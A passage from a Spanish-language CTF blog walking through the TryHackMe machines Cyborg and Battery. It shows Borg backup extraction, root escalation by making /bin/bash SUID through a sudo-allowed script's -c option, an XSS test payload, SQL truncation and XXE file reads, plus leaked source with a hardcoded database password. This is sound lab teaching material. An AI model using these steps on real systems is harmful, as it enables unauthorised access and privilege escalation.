112806..samantha5 Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed kali@kali:~/thm/cyborg$     1 2 3 4 5 6 7  #squid.conf auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd auth_param basic children 5 auth_param basic realm Squid Basic Authentication auth_param basic credentialsttl 2 hours acl auth_users proxy_auth REQUIRED http_access allow auth_users       'use strict'; var containerId = JSON.parse(\"\\\"692f0bdf604e17ca\\\"\"); var containerElem = document.getElementById(containerId); var codetabLinks = null; var codetabContents = null; var ids = []; if (containerElem) { codetabLinks = containerElem.querySelectorAll('.codetab__link'); codetabContents = containerElem.querySelectorAll('.codetab__content'); } for (var i = 0; i 0) { codetabContents[0].style.display = 'block'; }  Configuramos la contraseña encontrada como frase de BORG, listamos los archivos en el repositorio y encontramos music_archive el cual logramos extraer. El backup music_archive pertenece a la carpeta principal de alex donde encontramos su usuario y contraseña.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  kali@kali:~/thm/cyborg/home/field/dev/final_archive$ export BORG_PASSPHRASE=\u0026#39;[... REDACTED ...]\u0026#39; kali@kali:~/thm/cyborg/home/field/dev/final_archive$ /home/kali/tools/borg/borg-linux64 list . music_archive Tue, 2020-12-29 09:00:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82] kali@kali:~/thm/cyborg/home/field/dev/final_archive$ /home/kali/tools/borg/borg-linux64 extract .::music_archive kali@kali:~/thm/cyborg/home/field/dev/final_archive$ tree home/ home/ └── alex ├── Desktop │ └── secret.txt ├── Documents │ └── note.txt ├── Downloads ├── Music ├── Pictures ├── Public ├── Templates └── Videos 9 directories, 2 files kali@kali:~/thm/cyborg/home/field/dev/final_archive$ cat home/alex/Documents/note.txt Wow I\u0026#39;m awful at remembering Passwords so I\u0026#39;ve taken my Friends advice and noting them down! alex:[... REDACTED ...] kali@kali:~/thm/cyborg/home/field/dev/final_archive$   Utilizando dichas credenciales en el servicio SSH logramos obtener una shell y nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos sudo (root) para ejecutar el script /etc/mp3backups/backup.sh. Dicho script realiza una busqueda de archivos mp3 los cuales se escriben en un archivo, tambien realiza un backup de los archivos descritos en la variable backup_files utilizando tar, además de eso durante su ejecucion verifica las \u0026ldquo;flags\u0026rdquo; que se le pasan al script en este caso seria -c utilizando getopts y al finalizar se ejecuta los parametros/comandos que se le pasan a -c, es decir /etc/mp3backups/backup.sh -c COMANDO.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43  #!/bin/bash  sudo find / -name \u0026#34;*.mp3\u0026#34; | sudo tee /etc/mp3backups/backed_up_files.txt input=\u0026#34;/etc/mp3backups/backed_up_files.txt\u0026#34; #while IFS= read -r line #do #a=\u0026#34;/etc/mp3backups/backed_up_files.txt\u0026#34; # b=$(basename $input) #echo # echo \u0026#34;$line\u0026#34; #done \u0026lt; \u0026#34;$input\u0026#34; while getopts c: flag do case \u0026#34;${flag}\u0026#34; in c) command=${OPTARG};; esac done backup_files=\u0026#34;/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3\u0026#34; # Where to backup to. dest=\u0026#34;/etc/mp3backups/\u0026#34; # Create archive filename. hostname=$(hostname -s) archive_file=\u0026#34;$hostname-scheduled.tgz\u0026#34; # Print start status message. echo \u0026#34;Backing up $backup_filesto $dest/$archive_file\u0026#34; echo # Backup the files using tar. tar czf $dest/$archive_file $backup_files # Print end status message. echo echo \u0026#34;Backup finished\u0026#34; cmd=$($command) echo $cmd   Realizamo la ejecucion de bash (-c bash) pero la shell esta obsoleta, al ejecutar varios comandos no se muestran, solo lo hacen al salir de la shell. Por lo que le dimos permisos SUID a /bin/bash, luego de esto ejecutamos bash -p con el usuario Alex, lo que nos permitio obtener una shell root y nuestra flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  alex@ubuntu:~$ sudo /etc/mp3backups/backup.sh -c \u0026#39;chmod u+s /bin/bash\u0026#39; /home/alex/Music/image12.mp3 [... REDACTED ...] Backup finished alex@ubuntu:~$ bash -p bash-4.3# whoami; id; pwd root uid=1000(alex) gid=1000(alex) euid=0(root) groups=1000(alex),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare) /home/alex bash-4.3# exit exit alex@ubuntu:~$ bash -p bash-4.3# ls /root root.txt bash-4.3# cd /root bash-4.3# ls -lah total 36K drwx------ 4 root root 4.0K Dec 30 02:27 . drwxr-xr-x 24 root root 4.0K Dec 30 13:36 .. -rw------- 1 root root 2.9K Dec 31 10:50 .bash_history -rw-r--r-- 1 root root 3.1K Oct 22 2015 .bashrc drwx------ 2 root root 4.0K Aug 6 15:50 .cache drwxr-xr-x 2 root root 4.0K Dec 30 01:42 .nano -rw-r--r-- 1 root root 148 Aug 17 2015 .profile -r-xr--r-- 1 root root 43 Dec 30 02:26 root.txt -rw-r--r-- 1 root root 66 Dec 30 02:13 .selected_editor bash-4.3# cat root.txt flag{[... REDACTED ...]} bash-4.3#   ","description":"Cyborg es una maquina de TryHackMe, encontramos un backup creado con Borg, obtuvimos la contraseña enumerando la pagina web, dentro del backup encontramos las credenciales las cuales utilizamos en SSH. Para escalar privilegios analizamos un script el cual nos permitio dar permisos SUID a bash.","id":21,"section":"posts","tags":["rustbuster","john","sudo privesc","borg backup","getopts"],"title":"TryHackMe - Cyborg","uri":"https://sckull.github.io/posts/cyborg/"},{"content":"  Battery es una maquina de TryHackMe, encontramos correos dentro de un fichero y mediante SQL Truncation Attack obtuvimos acceso a un panel de administracion en donde explotamos una vulnerabilidad XXE por la cual obtuvimos credenciales de acceso. La mala configuracion de permisos en un script de python nos permitio escalar privilegios.\nRoom    Titulo battery      Descripción CTF designed by CTF lover for CTF lovers   Puntos 240   Dificultad Media   Maker Th3lazykid  golith3r00t     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ssh (22) y el puerto http (80) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  # Nmap 7.80 scan initiated Fri Jan 15 19:35:16 2021 as: nmap -p- --min-rate 1000 -o scanPorts battery.thm Nmap scan report for battery.thm (10.10.172.112) Host is up (0.34s latency). Not shown: 65380 closed ports, 153 filtered ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http # Nmap done at Fri Jan 15 19:37:22 2021 -- 1 IP address (1 host up) scanned in 125.83 seconds # Nmap 7.80 scan initiated Fri Jan 15 19:37:43 2021 as: nmap -sV -sC -p 22,80 -o servPort battery.thm Nmap scan report for battery.thm (10.10.172.112) Host is up (0.33s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 14:6b:67:4c:1e:89:eb:cd:47:a2:40:6f:5f:5c:8c:c2 (DSA) | 2048 66:42:f7:91:e4:7b:c6:7e:47:17:c6:27:a7:bc:6e:73 (RSA) | 256 a8:6a:92:ca:12:af:85:42:e4:9c:2b:0e:b5:fb:a8:8b (ECDSA) |_ 256 62:e4:a3:f6:c6:19:ad:30:0a:30:a1:eb:4a:d3:12:d3 (ED25519) 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) |_http-server-header: Apache/2.4.7 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Jan 15 19:38:01 2021 -- 1 IP address (1 host up) scanned in 18.13 seconds   HTTP Encontramos una pagina web en el puerto 80.\nRUSTBUSTER Utilizamos rustbuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39  kali@kali:~/thm/battery$ /opt/rustbuster/rustbuster dir -u http://battery.thm/ -w /usr/share/wordlists/dirb/common.txt -e php,html,txt -t 30 ~ rustbuster v3.0.3 ~ by phra \u0026amp; ps1dr3x ~tarted at\t: 2021-01-18 22:14:21 GET\t200 OK\thttp://battery.thm/ GET 200 OK http://battery.thm/acc.php GET 200 OK http://battery.thm/admin.php GET 200 OK http://battery.thm/admin.php GET 302 Found http://battery.thm/dashboard.php =\u0026gt; admin.php GET 200 OK http://battery.thm/forms.php GET 200 OK http://battery.thm/index.html GET 200 OK http://battery.thm/index.html GET 302 Found http://battery.thm/logout.php =\u0026gt; admin.php GET 200 OK http://battery.thm/register.php GET 200 OK http://battery.thm/report GET 301 Moved Permanently http://battery.thm/scripts =\u0026gt; http://battery.thm/scripts/ GET 403 Forbidden http://battery.thm/server-status GET 302 Found http://battery.thm/with.php =\u0026gt; admin.php [00:03:04] ######################################## 18444/18444 ETA: 00:00:00 req/s: 100 [?] Ended at: 2021-01-18 22:17:26   Encontramos un panel donde es posible ingresar y registrar un usuario, al registrar un usuario e ingresar vemos diferentes paginas las cuales tienen funcionalidades de retiar, depositar y transferir dinero para un usuario registrado, tambien en la pagina de inicio muestra el nombre de usuario, numero de cuenta, saldo actual y nombre del banco.\nTambien existen dos paginas en las cuales no es posible ingresar ya que es necesario privilegios de administracion, pero aun asi es posible leer \u0026ldquo;parte\u0026rdquo; del codigo fuente de una de estas paginas, al analizar vemos que realiza una \u0026ldquo;busqueda\u0026rdquo; mediante un formulario, mismo que ingresa los datos en un \u0026ldquo;template\u0026rdquo; de XML y lo envia a la misma pagina, cuando obtiene el resultado lo inserta dentro de un elemento de HTML con id errorMessage, con esto podriamos tomar la idea de un ataque XXE.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38  \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; function XMLFunction(){ var xml = \u0026#39;\u0026#39; + \u0026#39;\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt;\u0026#39; + \u0026#39;\u0026lt;root\u0026gt;\u0026#39; + \u0026#39;\u0026lt;name\u0026gt;\u0026#39; + $(\u0026#39;#name\u0026#39;).val() + \u0026#39;\u0026lt;/name\u0026gt;\u0026#39; + \u0026#39;\u0026lt;search\u0026gt;\u0026#39; + $(\u0026#39;#search\u0026#39;).val() + \u0026#39;\u0026lt;/search\u0026gt;\u0026#39; + \u0026#39;\u0026lt;/root\u0026gt;\u0026#39;; var xmlhttp = new XMLHttpRequest(); xmlhttp.onreadystatechange = function () { if(xmlhttp.readyState == 4){ console.log(xmlhttp.readyState); console.log(xmlhttp.responseText); document.getElementById(\u0026#39;errorMessage\u0026#39;).innerHTML = xmlhttp.responseText; } } xmlhttp.open(\u0026#34;POST\u0026#34;,\u0026#34;forms.php\u0026#34;,true); xmlhttp.send(xml); }; \u0026lt;/script\u0026gt; [... REDACTED ...] \u0026lt;fieldset\u0026gt; \u0026lt;p\u0026gt; \u0026lt;label for=\u0026#34;name\u0026#34;\u0026gt;Account Number\u0026lt;/label\u0026gt; \u0026lt;input id=\u0026#34;name\u0026#34; name=\u0026#34;name\u0026#34; type=\u0026#34;text\u0026#34; value=\u0026#34;\u0026#34; /\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;p\u0026gt; \u0026lt;label for=\u0026#34;search\u0026#34;\u0026gt;Remark\u0026lt;/label\u0026gt; \u0026lt;input id=\u0026#34;search\u0026#34; name=\u0026#34;search\u0026#34; type=\u0026#34;text\u0026#34; value=\u0026#34;\u0026#34; /\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;p\u0026gt; \u0026lt;button name=\u0026#34;snd\u0026#34; id=\u0026#34;Login\u0026#34; onclick=\u0026#34;XMLFunction()\u0026#34;\u0026gt;Send Message\u0026lt;/button\u0026gt; \u0026lt;/p\u0026gt; \u0026lt;/fieldset\u0026gt;   XSS Con el usuario registrado encontramos un posible vulnerabilidad de XSS en el campo de Account Number de la pagina Transfer Money.\n1  \u0026lt;b onmouseover=alert(\u0026#39;Batman-no-existe!\u0026#39;)\u0026gt;Dame clic!\u0026lt;/b\u0026gt;   REPORT Dentro de los directorios de la pagina encontramos un archivo ejecutable, al ejecutarlo pregunta por un usuario y contraseña. Ejecutamos strings sobre este archivo y encontramos algunos \u0026ldquo;correos\u0026rdquo; de usuarios, asi mismo utilizamos Ghidra para poder analizar el archivo, donde pudimos encontrar que es un archivo que solo contiene un menu y que no realiza ninguna de las acciones mostradas en las opciones disponibles. Tambien encontramos que el unico usuario que puede acceder a dichas opciones es guest:guest. Con esto solo pudimos obtener alguna lista de usuarios.\nbash c bash  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40  kali@kali:~/thm/battery$ strings report |more [... REDACTED ...] __gmon_start__ _ITM_registerTMCloneTable u/UH []A\\A]A^A_ admin@bank.a Password Updated Successfully! Sorry you can\u0026#39;t update the password Welcome Guest ===================Available Options============== 1. Check users 2. Add user 3. Delete user 4. change password 5. Exit clear ===============List of active users================ support@bank.a contact@bank.a cyber@bank.a admins@bank.a sam@bank.a admin0@bank.a super_user@bank.a control_admin@bank.a it_admin@bank.a Welcome To ABC DEF Bank Managemet System! UserName : Password : guest Your Choice : email : not available for guest account Wrong option Wrong username or password ;*3$\u0026#34; GCC: (Debian 9.3.0-15) 9.3.0 crtstuff.c [... REDACTED ...]     1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98  /*main*/ undefined8 main(void) { int iVar1; int local_8c; char local_88 [32]; char local_68 [32]; undefined local_48 [32]; undefined local_28 [32]; local_8c = 0; puts(\u0026#34;\\n\\n\\n\u0026#34;); puts(\u0026#34;Welcome To ABC DEF Bank Managemet System!\\n\\n\u0026#34;); printf(\u0026#34;UserName : \u0026#34;); __isoc99_scanf(\u0026amp;DAT_001021f0,local_68); puts(\u0026#34;\\n\u0026#34;); printf(\u0026#34;Password : \u0026#34;); __isoc99_scanf(\u0026amp;DAT_001021f0,local_88); iVar1 = strcmp(local_68,\u0026#34;guest\u0026#34;); if ((iVar1 == 0) \u0026amp;\u0026amp; (iVar1 = strcmp(local_88,\u0026#34;guest\u0026#34;), iVar1 == 0)) { options(); while (local_8c != 5) { printf(\u0026#34;Your Choice : \u0026#34;); __isoc99_scanf(\u0026amp;DAT_00102216,\u0026amp;local_8c); if (local_8c == 1) { users(); } else { if (local_8c == 4) { printf(\u0026#34;email : \u0026#34;); __isoc99_scanf(\u0026amp;DAT_001021f0,local_28); puts(\u0026#34;\\n\u0026#34;); printf(\u0026#34;Password : \u0026#34;); __isoc99_scanf(\u0026amp;DAT_001021f0,local_48); update(local_28,local_48,local_48); } else { if ((local_8c == 3) || (local_8c == 2)) { puts(\u0026#34;not available for guest account\\n\u0026#34;); system(\u0026#34;clear\u0026#34;); options(); } else { puts(\u0026#34;Wrong option\\n\u0026#34;); system(\u0026#34;clear\u0026#34;); options(); } } } } } else { printf(\u0026#34;Wrong username or password\u0026#34;); } return 0; } /*update*/ void update(char *pcParm1) { int iVar1; iVar1 = strcmp(pcParm1,\u0026#34;admin@bank.a\u0026#34;); if (iVar1 == 0) { puts(\u0026#34;Password Updated Successfully!\\n\u0026#34;); options(); } else { puts(\u0026#34;Sorry you can\\\u0026#39;t update the password\\n\u0026#34;); options(); } return; } /*users*/ void users(void) { system(\u0026#34;clear\u0026#34;); puts(\u0026#34;\\n===============List of active users================\u0026#34;); puts(\u0026#34;support@bank.a\u0026#34;); puts(\u0026#34;contact@bank.a\u0026#34;); puts(\u0026#34;cyber@bank.a\u0026#34;); puts(\u0026#34;admins@bank.a\u0026#34;); puts(\u0026#34;sam@bank.a\u0026#34;); puts(\u0026#34;admin0@bank.a\u0026#34;); puts(\u0026#34;super_user@bank.a\u0026#34;); puts(\u0026#34;admin@bank.a\u0026#34;); puts(\u0026#34;control_admin@bank.a\u0026#34;); puts(\u0026#34;it_admin@bank.a\\n\\n\u0026#34;); options(); return; }     1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42  kali@kali:~/thm/battery$ ./report Welcome To ABC DEF Bank Managemet System! UserName : guest Password : guest Welcome Guest ===================Available Options============== 1. Check users 2. Add user 3. Delete user 4. change password 5. Exit Your Choice : 1 ===============List of active users================ support@bank.a contact@bank.a cyber@bank.a admins@bank.a sam@bank.a admin0@bank.a super_user@bank.a admin@bank.a control_admin@bank.a it_admin@bank.a Welcome Guest ===================Available Options============== 1. Check users 2. Add user 3. Delete user 4. change password 5. Exit Your Choice :       'use strict'; var containerId = JSON.parse(\"\\\"db63a0cde34af398\\\"\"); var containerElem = document.getElementById(containerId); var codetabLinks = null; var codetabContents = null; var ids = []; if (containerElem) { codetabLinks = containerElem.querySelectorAll('.codetab__link'); codetabContents = containerElem.querySelectorAll('.codetab__content'); } for (var i = 0; i 0) { codetabContents[0].style.display = 'block'; }  Intentamos realizar inyeccion de SQL en todos los campos disponibles dentro de la pagina pero no logramos obtener ningun error o informacion. Aunque todavía teniamos una lista de posibles \u0026ldquo;usuarios\u0026rdquo; y \u0026ldquo;correos\u0026rdquo; los cuales podriamos registrar, obtener información o como ultimo recurso realizar un ataque de fuerza bruta al panel o al servicio SSH con hydra. Intentamos registrar solo los usuarios pero al ingresar en cada uno de ellos no logramos acceder a las paginas \u0026ldquo;administrativas\u0026rdquo;, tambien registrar los \u0026ldquo;correos\u0026rdquo; pero encontramos un problema, un \u0026ldquo;limite\u0026rdquo; el formulario de registro, especificamente el campo Username que esta limitado a un maximo de 12 caracteres, y los unicos usuarios que encontramos con ese numero de caracteres son cyber@bank.a, admin@bank.a.\nhtml bash  1 2 3 4 5 6 7  \u0026lt;form method=\u0026#34;POST\u0026#34; style=\u0026#34;text-align:center\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;uname\u0026#34; placeholder=\u0026#34;Username\u0026#34; maxlength=\u0026#34;12\u0026#34;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;bank\u0026#34; placeholder=\u0026#34;Bank name (ABC or DEF)\u0026#34;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34; placeholder=\u0026#34;password\u0026#34;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Register me!\u0026#34; name=\u0026#34;btn\u0026#34;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;a href=\u0026#34;admin.php\u0026#34;\u0026gt;Login\u0026lt;/a\u0026gt; \u0026lt;/form\u0026gt;     1 2 3 4  kali@kali:~/thm/battery$ grep -E \u0026#34;^.{11,12}$\u0026#34; users.txt cyber@bank.a admin@bank.a kali@kali:~/thm/battery$       'use strict'; var containerId = JSON.parse(\"\\\"945ca9821c76786b\\\"\"); var containerElem = document.getElementById(containerId); var codetabLinks = null; var codetabContents = null; var ids = []; if (containerElem) { codetabLinks = containerElem.querySelectorAll('.codetab__link'); codetabContents = containerElem.querySelectorAll('.codetab__content'); } for (var i = 0; i 0) { codetabContents[0].style.display = 'block'; }  SQL Truncation Attack En el caso de cyber@bank.a logramos registrarlo pero no obtener acceso, con admin@bank.a encontramos que el usuario ya estaba registrado, sabiendo esto buscamos alguna vulnerabilidad con la cual pudieramos cambiar de alguna forma la contraseña de este usuario, logramos encontrar un tipo de ataque con el cual es posible \u0026ldquo;registar\u0026rdquo; y con esto cambiar la contraseña de un usuario, ya que la aplicacion utiliza MySQL con su configuracion por default: SQL Truncation Attack\nRegistramos el usuario admin@bank.a y le agregamos espacios y una palabra o caracter cualquiera al final, con los campos solicitados, lo que nos permitio registrar el usuario y cambiar su contraseña.\nIngresamos con usuario y contraseña registrada y pudimos obtener acceso a las paginas \u0026ldquo;administrativas\u0026rdquo;.\nXXE Como bien se menciono anteriormente que posiblemente existia una vulnerabilidad XXE en la pagina command ya que esta envia los parametros number account (\u0026lt;name\u0026gt;\u0026lt;/name\u0026gt;) y remark (\u0026lt;search\u0026gt;\u0026lt;/search\u0026gt;) dentro de una estructura o template XML. Realizamos una \u0026ldquo;busqueda\u0026rdquo; y la respuesta de esta fue insertada en la pagina, pero la respuesta pertenece a remark por lo que seguramente podriamos intentar realizar una lectura de un archivo e \u0026ldquo;insertarlo\u0026rdquo; en la etiqueta/elemento remark (\u0026lt;search\u0026gt;\u0026lt;/search\u0026gt;) para que se muestre en la pagina.\n1  \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt;\u0026lt;root\u0026gt;\u0026lt;name\u0026gt;22\u0026lt;/name\u0026gt;\u0026lt;search\u0026gt;Batman\u0026lt;/search\u0026gt;\u0026lt;/root\u0026gt;   Utilizamos la estructura XML existente junto con el payload de lectura para le archivo /etc/passwd, el cual se mostró en la pagina. Dentro de la respuesta de este archivo pudimos observar que existen dos usuarios: cyber y yash.\nLuego de esto intenamos realizar una enumeracion utilizando el mismo payload para leer archivos dentro de la maquina, lo cual fue imposible para algunos archivos por lo que utilizamos un Wrapper dentro de nuestra estrucutra para poder obtener en base64 el archivo solicitado. Dentro del codigo fuente de las paginas encontramos credenciales comentadas para el usuario cyber y para la base de datos.\nphp php php  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67  \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;style\u0026gt; [... REDACTED ...] \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;dashboard.php\u0026#34;\u0026gt;Dashboard\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;with.php\u0026#34;\u0026gt;Withdraw Money\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;depo.php\u0026#34;\u0026gt;Deposit Money\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;tra.php\u0026#34;\u0026gt;Transfer Money\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;acc.php\u0026#34;\u0026gt;My Account\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;forms.php\u0026#34;\u0026gt;command\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;logout.php\u0026#34;\u0026gt;Logout\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li style=\u0026#34;float:right\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;contact.php\u0026#34;\u0026gt;Contact Us\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026lt;?php session_start(); if(isset($_SESSION[\u0026#39;favcolor\u0026#39;]) and $_SESSION[\u0026#39;favcolor\u0026#39;]===\u0026#34;admin@bank.a\u0026#34;) { echo \u0026#34;\u0026lt;h3 style=\u0026#39;text-align:center;\u0026#39;\u0026gt;Weclome to Account control panel\u0026lt;/h3\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;form method=\u0026#39;POST\u0026#39;\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;input type=\u0026#39;text\u0026#39; placeholder=\u0026#39;Account number\u0026#39; name=\u0026#39;acno\u0026#39;\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;input type=\u0026#39;text\u0026#39; placeholder=\u0026#39;Message\u0026#39; name=\u0026#39;msg\u0026#39;\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;input type=\u0026#39;submit\u0026#39; value=\u0026#39;Send\u0026#39; name=\u0026#39;btn\u0026#39;\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;/form\u0026gt;\u0026#34;; //MY CREDS :- cyber:[... REDACTED ...]  if(isset($_POST[\u0026#39;btn\u0026#39;])) { $ms=$_POST[\u0026#39;msg\u0026#39;]; echo \u0026#34;ms:\u0026#34;.$ms; if($ms===\u0026#34;id\u0026#34;) { system($ms); } else if($ms===\u0026#34;whoami\u0026#34;) { system($ms); } else { echo \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;RCE Detected!\u0026#39;)\u0026lt;/script\u0026gt;\u0026#34;; session_destroy(); unset($_SESSION[\u0026#39;favcolor\u0026#39;]); header(\u0026#34;Refresh: 0.1; url=index.html\u0026#34;); } } } else { echo \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;Only Admins can access this page!\u0026#39;)\u0026lt;/script\u0026gt;\u0026#34;; session_destroy(); unset($_SESSION[\u0026#39;favcolor\u0026#39;]); header(\u0026#34;Refresh: 0.1; url=index.html\u0026#34;); } ?\u0026gt; ```     1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75  \u0026lt;html\u0026gt; \u0026lt;title\u0026gt;Login\u0026lt;/title\u0026gt; \u0026lt;body style=\u0026#34;background-color:black\u0026#34;\u0026gt; \u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;h3 style=\u0026#34;color:red;text-align:center\u0026#34;\u0026gt;Bank Of Abc Def User Login\u0026lt;/h3\u0026gt; \u0026lt;br\u0026gt; \u0026lt;style\u0026gt; form{ border: 2px solid black; outline: #4CAF50 solid 3px; margin: auto; width:180px; padding: 20px; text-align: center; } \u0026lt;/style\u0026gt; \u0026lt;form method=\u0026#34;POST\u0026#34; style=\u0026#34;text-align:center\u0026#34; name=\u0026#34;myForm\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;uname\u0026#34; placeholder=\u0026#34;Username\u0026#34; maxlength=\u0026#34;14\u0026#34;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input type=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34; placeholder=\u0026#34;password\u0026#34;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Submit\u0026#34; name=\u0026#34;btn\u0026#34;\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;a href=\u0026#34;register.php\u0026#34;\u0026gt;New user?register here.\u0026lt;/a\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026lt;?php error_reporting(0); session_start(); if(isset($_POST[\u0026#39;btn\u0026#39;])) { $id=$_POST[\u0026#39;uname\u0026#39;]; $pass=$_POST[\u0026#39;password\u0026#39;]; try { $dbh = new PDO(\u0026#39;mysql:host=127.0.0.1;dbname=details\u0026#39;, \u0026#39;root\u0026#39;, \u0026#39;idkpass\u0026#39;); $dbh-\u0026gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); } catch(PDOException $ex){ echo \u0026#39;Execute Failed: \u0026#39;.$ex-\u0026gt;getMessage(); } $q = \u0026#34;SELECT username,password,cno,bank_name,amount FROM users WHERE username = :id and password= :pass\u0026#34;; $sth = $dbh-\u0026gt;prepare($q); $sth-\u0026gt;bindParam(\u0026#39;:id\u0026#39;, $id); $sth-\u0026gt;bindParam(\u0026#39;:pass\u0026#39;,$pass); 